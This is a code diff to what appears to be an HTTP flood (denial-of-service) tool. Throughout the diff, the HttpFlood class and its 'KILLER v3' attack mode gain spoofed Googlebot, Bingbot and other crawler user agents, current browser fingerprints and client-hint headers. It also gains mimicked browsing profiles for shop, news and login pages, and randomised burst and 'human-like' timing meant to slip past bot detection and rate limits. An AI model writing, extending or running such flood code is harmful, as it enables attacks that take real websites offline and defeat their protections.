@@ -150,7 +150,9 @@ search_engine_agents = [
     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
     "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
     "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
-    "+http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
+    "+http://www.google.com/bot.html) Chrome/131.0.6778.204 Safari/537.36",
+    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
+    "+http://www.google.com/bot.html) Chrome/134.0.6998.35 Safari/537.36",
     "Googlebot-Image/1.0",
     "Googlebot-Video/1.0",
     "Googlebot-News",
@@ -162,7 +164,10 @@ search_engine_agents = [
 
     # ---------------- Bing / Microsoft ----------------
     "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 "
+    "(KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
     "BingPreview/1.0b",
+    "BingPreview/2.0",
     "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",
 
     # ---------------- Yahoo ----------------
@@ -171,13 +176,19 @@ search_engine_agents = [
 
     # ---------------- Yandex ----------------
     "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots; mirror)",
     "YandexMobileBot/3.0 (+http://yandex.com/bots)",
     "YandexImages/3.0 (+http://yandex.com/bots)",
     "YandexVideo/3.0 (+http://yandex.com/bots)",
     "YandexNews/3.0 (+http://yandex.com/bots)",
+    "YandexFavicons/1.0 (+http://yandex.com/bots)",
+    "YandexWebmaster/2.0 (+http://yandex.com/bots)",
+    "YandexPagechecker/1.0 (+http://yandex.com/bots)",
+    "YandexImageResizer/1.0 (+http://yandex.com/bots)",
 
     # ---------------- Baidu ----------------
     "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
+    "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
     "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
     "Baiduspider-video (+http://www.baidu.com/search/spider.html)",
 
@@ -187,11 +198,15 @@ search_engine_agents = [
 
     # ---------------- Applebot ----------------
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
-    "(KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; "
+    "(KHTML, like Gecko) Version/18.0 Safari/605.1.15 (Applebot/0.1; "
+    "+http://www.apple.com/go/applebot)",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
+    "(KHTML, like Gecko) Version/17.6 Safari/605.1.15 (Applebot/0.1; "
     "+http://www.apple.com/go/applebot)",
 
     # ---------------- Facebook / Social ----------------
     "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
+    "facebookexternalhit/1.2 (+http://www.facebook.com/externalhit_uatext.php)",
     "Facebot/1.0",
 
     # ---------------- Twitter ----------------
@@ -202,16 +217,24 @@ search_engine_agents = [
 
     # ---------------- Pinterest ----------------
     "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
+    "Pinterest (+https://www.pinterest.com/)",
 
     # ---------------- Other Major Bots ----------------
     "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
+    "Mozilla/5.0 (compatible; AhrefsBot/9.0; +http://ahrefs.com/robot/)",
     "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
+    "SemrushBot/3~bl (+http://www.semrush.com/bot.html)",
     "MJ12bot/v1.4.8 (http://mj12bot.com/)",
     "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
+    "Sogou inst spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
     "Exabot/3.0 (+http://www.exabot.com/go/robot)",
     "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
     "CCBot/2.0 (+http://commoncrawl.org/faq/)",
-    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)"
+    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)",
+    "Mozilla/5.0 (compatible; GPTBot/1.0; +https://openai.com/gptbot)",
+    "Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com)",
+    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/131.0.6778.204 Mobile Safari/537.36 (compatible, Googlebot/2.1; +http://www.google.com/bot.html)",
 ]
 
 
@@ -852,41 +875,39 @@ class HttpFlood(Thread):
 
         if not useragents:
             useragents: List[str] = [
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 ',
-                'Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 ',
-                'Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ',
-                'Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577',
-                'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',
-                'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
-                'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
-                'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
-                'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
-                'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
-                'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0',
+                'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
+                'Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
+                'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
+                'Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
+                'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
+                'Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36',
+                'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
+                'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
+                'Mozilla/5.0 (Linux; Android 14; SM-A556B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
+                'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
+                'Mozilla/5.0 (Linux; Android 14; SM-S926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/100.0.0.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/100.0.0.0',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Vivaldi/6.7',
             ]
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
@@ -1093,8 +1114,8 @@ class HttpFlood(Thread):
 
     # ── KILLER v3: Browser fingerprints (UA → headers → order) ───────────
     _KILLER_FINGERPRINTS = (
-        # Chrome 120+ on Windows 10/11
-        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        # Chrome 135 on Windows 10/11
+        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
          "order": _KILLER_CHROME_ORDER,
          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
          "languages": ("en-US,en;q=0.9", "en-GB,en-US;q=0.9,en;q=0.8",
@@ -1110,28 +1131,46 @@ class HttpFlood(Thread):
                        "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
                        "nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7",
                        "sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7"),
-         "sec_ch_ua": '"Chromium";v="120", "Google Chrome";v="120", "Not?A_Brand";v="99"',
-         "platform": '"Windows"'},
-        # Chrome 119 on macOS
-        {"ua_prefix": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+         "sec_ch_ua": '"Chromium";v="135", "Google Chrome";v="135", "Not?A_Brand";v="99"',
+         "platform": '"Windows"',
+         "device_memory": ("8", "16"),
+         "viewport": ("1920x1080", "2560x1440", "1366x768", "1536x864"),
+         "ect": ("4g", "3g"),
+         "rtt": ("50", "100", "150"),
+         "downlink": ("10", "5", "2.5"),
+        },
+        # Chrome 134 on macOS
+        {"ua_prefix": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
          "order": _KILLER_CHROME_ORDER,
          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
          "languages": ("en-US,en;q=0.9", "en-GB,en;q=0.8",
                        "ja-JP,ja;q=0.9,en;q=0.8",
                        "fr-FR,fr;q=0.9,en;q=0.8",
                        "de-DE,de;q=0.9,en;q=0.8"),
-         "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="119", "Google Chrome";v="119"',
-         "platform": '"macOS"'},
-        # Chrome 120 on Linux
-        {"ua_prefix": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+         "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="134", "Google Chrome";v="134"',
+         "platform": '"macOS"',
+         "device_memory": ("8", "16"),
+         "viewport": ("2560x1600", "1440x900", "1680x1050"),
+         "ect": ("4g", "3g"),
+         "rtt": ("50", "100"),
+         "downlink": ("10", "5"),
+        },
+        # Chrome 135 on Linux
+        {"ua_prefix": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
          "order": _KILLER_CHROME_ORDER,
          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
          "languages": ("en-US,en;q=0.9", "en-GB,en;q=0.8",
                        "pt-BR,pt;q=0.9,en;q=0.8"),
-         "sec_ch_ua": '"Chromium";v="120", "Google Chrome";v="120", "Not?A_Brand";v="24"',
-         "platform": '"Linux"'},
-        # Firefox 121 on Windows
-        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101",
+         "sec_ch_ua": '"Chromium";v="135", "Google Chrome";v="135", "Not?A_Brand";v="24"',
+         "platform": '"Linux"',
+         "device_memory": ("8", "16"),
+         "viewport": ("1920x1080", "2560x1440"),
+         "ect": ("4g", "3g"),
+         "rtt": ("50", "100"),
+         "downlink": ("10", "5"),
+        },
+        # Firefox 135 on Windows
+        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
          "order": _KILLER_FIREFOX_ORDER,
          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
          "languages": ("en-US,en;q=0.5", "en-US,en;q=0.9",
@@ -1139,39 +1178,70 @@ class HttpFlood(Thread):
                        "fr-FR,fr;q=0.9,en-US;q=0.8",
                        "es-ES,es;q=0.9,en;q=0.5",
                        "it-IT,it;q=0.9,en;q=0.5"),
-         "sec_ch_ua": None, "platform": None},
-        # Firefox 121 on macOS
-        {"ua_prefix": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101",
+         "sec_ch_ua": None, "platform": None,
+         "device_memory": None, "viewport": None,
+         "ect": None, "rtt": None, "downlink": None},
+        # Firefox 134 on macOS
+        {"ua_prefix": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0",
          "order": _KILLER_FIREFOX_ORDER,
          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-         "languages": ("en-US,en;q=0.5", "ja-JP,ja;q=0.7,en;q=0.3"),
-         "sec_ch_ua": None, "platform": None},
-        # Firefox 121 on Linux
-        {"ua_prefix": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101",
+         "languages": ("en-US,en;q=0.5", "ja-JP,ja;q=0.7,en;q=0.3",
+                       "fr-FR,fr;q=0.9,en;q=0.5"),
+         "sec_ch_ua": None, "platform": None,
+         "device_memory": None, "viewport": None,
+         "ect": None, "rtt": None, "downlink": None},
+        # Firefox 135 on Linux
+        {"ua_prefix": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
          "order": _KILLER_FIREFOX_ORDER,
          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-         "languages": ("en-US,en;q=0.5", "en-GB,en;q=0.5"),
-         "sec_ch_ua": None, "platform": None},
-        # Safari 17 on macOS
-        {"ua_prefix": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15",
+         "languages": ("en-US,en;q=0.5", "en-GB,en;q=0.5",
+                       "de-DE,de;q=0.9,en;q=0.5"),
+         "sec_ch_ua": None, "platform": None,
+         "device_memory": None, "viewport": None,
+         "ect": None, "rtt": None, "downlink": None},
+        # Safari 18.2 on macOS 15 Sequoia
+        {"ua_prefix": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
          "order": _KILLER_SAFARI_ORDER,
          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "languages": ("en-US,en;q=0.9", "en-GB,en;q=0.8",
-                       "fr-FR,fr;q=0.9"),
-         "sec_ch_ua": None, "platform": None},
-        # Safari 17 on iPhone
-        {"ua_prefix": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15",
+                       "fr-FR,fr;q=0.9", "de-DE,de;q=0.9"),
+         "sec_ch_ua": None, "platform": None,
+         "device_memory": None, "viewport": None,
+         "ect": None, "rtt": None, "downlink": None},
+        # Safari 18.2 on iPhone
+        {"ua_prefix": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
          "order": _KILLER_SAFARI_ORDER,
          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "languages": ("en-US,en;q=0.9", "en-GB,en;q=0.8"),
-         "sec_ch_ua": None, "platform": None},
-        # Edge 120 on Windows
-        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+         "sec_ch_ua": None, "platform": None,
+         "device_memory": None, "viewport": None,
+         "ect": None, "rtt": None, "downlink": None},
+        # Edge 135 on Windows
+        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0",
          "order": _KILLER_EDGE_ORDER,
          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
          "languages": ("en-US,en;q=0.9", "en-GB,en-US;q=0.9,en;q=0.8"),
-         "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
-         "platform": '"Windows"'},
+         "sec_ch_ua": '"Chromium";v="135", "Not?A_Brand";v="8", "Microsoft Edge";v="135"',
+         "platform": '"Windows"',
+         "device_memory": ("8", "16"),
+         "viewport": ("1920x1080", "2560x1440"),
+         "ect": ("4g", "3g"),
+         "rtt": ("50", "100"),
+         "downlink": ("10", "5"),
+        },
+        # Edge 134 on Windows (secondary)
+        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
+         "order": _KILLER_EDGE_ORDER,
+         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+         "languages": ("en-US,en;q=0.9", "de-DE,de;q=0.9,en;q=0.8"),
+         "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="134", "Microsoft Edge";v="134"',
+         "platform": '"Windows"',
+         "device_memory": ("8", "16"),
+         "viewport": ("1920x1080", "1366x768"),
+         "ect": ("4g", "3g"),
+         "rtt": ("50", "100"),
+         "downlink": ("10", "5"),
+        },
     )
 
     # ── KILLER v3: Request pattern profiles (browser mimicry) ─────────────
@@ -1197,6 +1267,32 @@ class HttpFlood(Thread):
             ("POST", "/api/poll"),
             ("GET", "/manifest.json"),
         )),
+        ("SPA_NAV", (
+            ("GET", "/"),
+            ("GET", "/assets/main.{rand}.js"),
+            ("GET", "/assets/vendor.{rand}.js"),
+            ("GET", "/api/v2/config"),
+            ("GET", "/api/v2/user"),
+        )),
+        ("ECOMMERCE", (
+            ("GET", "/"),
+            ("GET", "/products?sort={rand}"),
+            ("GET", "/product/{rand}"),
+            ("POST", "/api/cart/add"),
+            ("GET", "/cart"),
+        )),
+        ("NEWS_FEED", (
+            ("GET", "/"),
+            ("GET", "/api/feed?cursor={rand}"),
+            ("GET", "/api/feed?cursor={rand}&limit=20"),
+            ("GET", "/static/ads/banner.{rand}.jpg"),
+        )),
+        ("LOGIN_FLOW", (
+            ("GET", "/login"),
+            ("GET", "/static/css/auth.css"),
+            ("GET", "/static/js/auth.bundle.js"),
+            ("POST", "/api/auth/login"),
+        )),
         ("RAW_FLOOD", None),
     )
 
@@ -1218,6 +1314,10 @@ class HttpFlood(Thread):
         "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
         "upgrade-insecure-requests", "sec-gpc", "priority",
         "sec-ch-ua-mobile", "sec-ch-ua-platform", "x-requested-with",
+        "device-memory", "viewport-width", "ect", "rtt",
+        "downlink", "purpose", "sec-purpose", "width",
+        "sec-ch-ua-full-version-list", "sec-ch-ua-model",
+        "save-data", "max-downlink", "downlink", "dpr",
     ))
 
     def KILLER(self) -> None:
@@ -1239,7 +1339,7 @@ class HttpFlood(Thread):
             p.join()
 
     def _killer_process_main(self, max_workers: int, rpc: int) -> None:
-        from random import uniform
+        from random import uniform, randint, choice as rc
 
         conn_pool = []
         conn_lock = Lock()
@@ -1283,18 +1383,42 @@ class HttpFlood(Thread):
         with ThreadPoolExecutor(max_workers=max_workers) as pool:
             while active:
                 refill_pool()
-                burst = max(max_workers // 4, 10)
+                # ── Super Power: Variable burst sizes for traffic shaping ──
+                burst_type = rc(("normal", "burst", "sustained", "wave"))
+                if burst_type == "normal":
+                    burst = max(max_workers // 4, 10)
+                elif burst_type == "burst":
+                    burst = max(max_workers // 2, 20)
+                elif burst_type == "sustained":
+                    burst = max(max_workers // 3, 15)
+                else:
+                    burst = max(max_workers // 6, 8)
+
                 for _ in range(burst):
                     pool.submit(self._killer_worker_v3,
                                 get_connection, return_connection, rpc)
-                sleep(base_delay * uniform(0.3, 1.0))
+
+                if burst_type == "burst":
+                    sleep(base_delay * uniform(0.1, 0.4))
+                elif burst_type == "sustained":
+                    sleep(base_delay * uniform(0.3, 0.8))
+                elif burst_type == "wave":
+                    sleep(base_delay * uniform(2.0, 5.0))
+                else:
+                    sleep(base_delay * uniform(0.3, 1.0))
+
+                # ── Follow-up micro-burst ─────────────────────────────
                 for _ in range(max(burst // 3, 5)):
                     pool.submit(self._killer_worker_v3,
                                 get_connection, return_connection, rpc)
-                sleep(base_delay * uniform(1.5, 4.0))
+
+                if burst_type == "wave":
+                    sleep(base_delay * uniform(0.5, 1.0))
+                else:
+                    sleep(base_delay * uniform(1.5, 4.0))
 
     def _killer_worker_v3(self, get_conn, return_conn, rpc: int) -> None:
-        from random import uniform, choice as rc
+        from random import uniform, choice as rc, randint
 
         fp = rc(self._KILLER_FINGERPRINTS)
         profile_name, profile_steps = rc(self._KILLER_PROFILES)
@@ -1305,20 +1429,33 @@ class HttpFlood(Thread):
 
         try:
             if profile_steps and profile_name != "RAW_FLOOD":
-                for method, path in profile_steps:
+                for i, (method, path) in enumerate(profile_steps):
                     path = path.replace("{rand}",
                                         ProxyTools.Random.rand_str(8))
                     payload = self._killer_build_request(method, path, fp)
                     if not Tools.send(s, payload):
                         break
-                    sleep(uniform(0.01, 0.08))
+                    # ── Super Power: Human-like timing between requests ──
+                    if i == 0:
+                        sleep(uniform(0.05, 0.2))
+                    elif i == 1:
+                        sleep(uniform(0.01, 0.06))
+                    elif i == 2:
+                        sleep(uniform(0.005, 0.04))
+                    else:
+                        sleep(uniform(0.003, 0.02))
             else:
                 batch = min(rpc, randint(5, 15))
